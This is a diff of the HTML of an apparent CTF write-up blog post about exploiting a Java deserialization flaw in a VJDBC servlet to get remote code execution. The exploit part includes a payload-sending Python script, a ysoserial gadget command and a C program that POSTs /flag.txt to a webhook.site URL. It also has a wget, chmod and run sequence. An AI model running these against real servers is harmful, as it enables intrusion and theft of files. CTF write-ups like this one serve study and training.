@@ -21,12 +21,11 @@
   <meta name="twitter:title" content="EGCERT-CTF JDBCLeak Exploit">
   <meta name="twitter:description" content="JDBCLeak Leak was a challenge introducted in EGCERT CTF Finals 2025 under the category R&amp;D , tbh i didn’t even look at the challenge during CTF Time , didn’t expect this category to introduce such good example of a real case code review challenge , however after reading the author’s blog here about the category and challenge i thought of trying it myself and create a POC for it to get rce reading /flag.txt , we got 3rd place btw :“D">
       <meta name="twitter:site" content="@tinkerhell1337">
-<meta name="application-name" content="0xMesbaha">
-<meta name="apple-mobile-web-app-title" content="0xMesbaha">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/osint/2024-11-30-cyctf-finals-osint-writeups/" /><link rel="next" href="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/osint/2024-11-30-cyctf-finals-osint-writeups/" /><link rel="next" href="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -45,18 +44,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -120,7 +108,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">EGCERT-CTF JDBCLeak Exploit</h1><div class="post-meta">
-            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/code-review/">Code Review</a></span></div>
+            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/code-review/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Code Review</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-28">2025-05-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;693 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -145,12 +133,7 @@
 <li><code>/vjdbc</code> endpoint has servlet <code>VJdbcServlet</code></li>
 <li><code>VJdbcServlet</code> servlet is mapped to class <code>de.simplicit.vjdbc.server.servlet.ServletCommandSink</code> which should be our start point.</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-xml">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE web-app
 </span></span></span><span class="line"><span class="cl"><span class="cp">    PUBLIC &#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&#34;
@@ -173,14 +156,9 @@
 </span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>VJdbcServlet<span class="nt">&lt;/servlet-name&gt;</span>
 </span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/vjdbc<span class="nt">&lt;/url-pattern&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet-mapping&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span></span></span></code></pre></div></div>
-<p>The code base is not really that big and can easily identify the <code>readObject</code> function used multiple times</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-java">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">handleRequest</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
+</span></span></code></pre></div><p>The code base is not really that big and can easily identify the <code>readObject</code> function used multiple times</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">handleRequest</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
@@ -209,49 +187,29 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readUTF</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">Properties</span><span class="w"> </span><span class="n">props</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Properties</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="c1">// BUG</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">Properties</span><span class="w"> </span><span class="n">clientInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Properties</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="c1">// BUG</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">CallingContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">CallingContext</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">BUG</span></span></span></code></pre></div></div>
-<p>As shown we have to pass the check <code>if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND))</code> to send our serialized object raw format to be deserilaized.</p>
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">CallingContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">CallingContext</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="c1">// BUG</span><span class="w">
+</span></span></span></code></pre></div><p>As shown we have to pass the check <code>if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND))</code> to send our serialized object raw format to be deserilaized.</p>
 <p>the method variable value is from <code>METHOD_IDENTIFIER</code> , searching for it will find it is :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-java">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// java\de\simplicit\vjdbc\servlet\ServletCommandSinkIdentifier.java</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// java\de\simplicit\vjdbc\servlet\ServletCommandSinkIdentifier.java</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">ServletCommandSinkIdentifier</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">METHOD_IDENTIFIER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;vjdbc-method&#34;</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">CONNECT_COMMAND</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;connect&#34;</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">PROCESS_COMMAND</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;process&#34;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
-<p>and the <code>PROCESS_COMMAND</code> is simply <code>process</code> so we have to send the following headers to <code>/vjdbc</code></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>Content-Type: binary/x-java-serialized
-vjdbc-method: process</code></pre></div>
-<p>sending GET or POST will both call the target function <code>handleRequest</code></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-java">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>and the <code>PROCESS_COMMAND</code> is simply <code>process</code> so we have to send the following headers to <code>/vjdbc</code></p>
+<pre tabindex="0"><code>Content-Type: binary/x-java-serialized
+vjdbc-method: process
+</code></pre><p>sending GET or POST will both call the target function <code>handleRequest</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">handleRequest</span><span class="p">(</span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">handleRequest</span><span class="p">(</span><span class="n">httpServletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">httpServletResponse</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></div></div>
-<h2 id="exploiting-virtual-jdbc">Exploiting Virtual JDBC</h2>
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h2 id="exploiting-virtual-jdbc">Exploiting Virtual JDBC</h2>
 <p>I have made a simple script to send the raw payload and will use it in sending any payload</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-python">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_bin_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">bin_file_path</span><span class="p">):</span>
@@ -288,50 +246,30 @@ vjdbc-method: process</code></pre></div>
 </span></span><span class="line"><span class="cl">    <span class="n">target_url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">    <span class="n">bin_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">    <span class="n">send_bin_payload</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">bin_file</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done !&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
-<p>Now testing the vulnerability , the app imports alot of apache libraries which seems good time to try <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer ">ysoserial</a> common collections gadgets payloads</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-java">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.*</span></span></span></code></pre></div></div>
-<p>Trying Generate multiple payloads using common collections 1,2,..7 until this one workd <em>this java options just for openjdk version 17 you may not need them</em></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java <span class="se">\ </span>                                                          
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done !&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Now testing the vulnerability , the app imports alot of apache libraries which seems good time to try <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer ">ysoserial</a> common collections gadgets payloads</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.*</span><span class="w">
+</span></span></span></code></pre></div><p>Trying Generate multiple payloads using common collections 1,2,..7 until this one workd <em>this java options just for openjdk version 17 you may not need them</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java <span class="se">\ </span>                                                          
 </span></span><span class="line"><span class="cl"> --add-opens<span class="o">=</span>java.xml/com.sun.org.apache.xalan.internal.xsltc.trax<span class="o">=</span>ALL-UNNAMED<span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span> --add-opens<span class="o">=</span>java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime<span class="o">=</span>ALL-UNNAMED<span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span> --add-opens<span class="o">=</span>java.base/sun.reflect.annotation<span class="o">=</span>ALL-UNNAMED<span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span> -jar ~/tools/ysoserial.jar CommonsCollections7 <span class="s2">&#34;curl https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7&#34;</span> &gt; shell.bin</span></span></code></pre></div></div>
-<p>then run the script will get a call back , now to get the flag.txt content tried multiple payloads but there was some issues so i generated a binary and executed it eventually</p>
+</span></span></span><span class="line"><span class="cl"><span class="se"></span> -jar ~/tools/ysoserial.jar CommonsCollections7 <span class="s2">&#34;curl https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7&#34;</span> &gt; shell.bin
+</span></span></code></pre></div><p>then run the script will get a call back , now to get the flag.txt content tried multiple payloads but there was some issues so i generated a binary and executed it eventually</p>
 <h3 id="generate-a-payload">Generate a payload</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-C&#43;&#43;">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;curl -X POST -F &#39;file=@/flag.txt&#39; https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// compile with
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">gcc</span> <span class="n">test</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">test</span></span></span></code></pre></div></div>
-<p>Now will generate 3 java serilaized objects and run the python script for each to get the final flag</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://server/test
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">gcc</span> <span class="n">test</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">test</span>
+</span></span></code></pre></div><p>Now will generate 3 java serilaized objects and run the python script for each to get the final flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://server/test
 </span></span><span class="line"><span class="cl">chmod +x ./test
-</span></span><span class="line"><span class="cl">./test</span></span></code></pre></div></div>
-<p><img
+</span></span><span class="line"><span class="cl">./test
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/CTFs/MISC/POC.png"
@@ -347,7 +285,7 @@ vjdbc-method: process</code></pre></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-title="EGCERT-CTF JDBCLeak Exploit" data-via="tinkerhell1337" data-hashtags="CTF,Java-Deserialization,RCE"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2fcode-review%2f2025-05-29-jdbcleak-egcert-finals%2f&amp;text=EGCERT-CTF%20JDBCLeak%20Exploit" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-title="EGCERT-CTF JDBCLeak Exploit" data-via="tinkerhell1337" data-hashtags="CTF,Java-Deserialization,RCE"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-title="EGCERT-CTF JDBCLeak Exploit"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-title="EGCERT-CTF JDBCLeak Exploit"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" data-title="EGCERT-CTF JDBCLeak Exploit"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -364,17 +302,14 @@ vjdbc-method: process</code></pre></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
